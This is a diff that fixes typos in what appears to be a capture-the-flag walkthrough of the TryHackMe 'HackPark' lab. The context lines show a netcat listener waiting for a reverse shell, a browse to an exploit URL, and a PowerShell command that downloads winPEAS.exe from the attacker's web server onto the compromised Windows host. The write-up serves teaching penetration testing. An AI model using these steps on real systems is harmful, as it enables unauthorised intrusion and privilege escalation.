@@ -89,7 +89,7 @@ We fire up BurpSuite to analyze the traffic, then attempt to login in with usern
 
 ![hackpark-failedlogin](/assets/images/2021-01-30-17-00-13.png)
 
-THe login failed but we captured the traffic in Burp:
+The login failed but we captured the traffic in Burp:
 
 ![hackpark-post](/assets/images/2021-01-30-16-30-29.png)
 
@@ -203,7 +203,7 @@ root@kali:/home/kali/thm/hackpark# nc -nlvp 1234
 listening on [any] 1234 ...
 ```
 
-THen as described in the exploit we browse to the URL mentioned:
+Then as described in the exploit we browse to the URL mentioned:
 
 ![hackpark-exploiturl](/assets/images/2021-01-30-17-20-54.png)
 
@@ -238,7 +238,7 @@ We need a web server running on Kali so we can pull files from it to the HackPar
 kali@kali:~/thm/hackpark$ python3 -m http.server
 ```
 
-CD in to the temp folder which is writeable by everyone, then sse PowerShell to pull winPEAS over:
+CD in to the temp folder which is writeable by everyone, then use PowerShell to pull winPEAS over:
 
 ```text
 C:\Windows\temp> PowerShell Invoke-WebRequest -Uri http://10.14.6.200:8000/winPEAS.exe -Outfile winpeas.exe
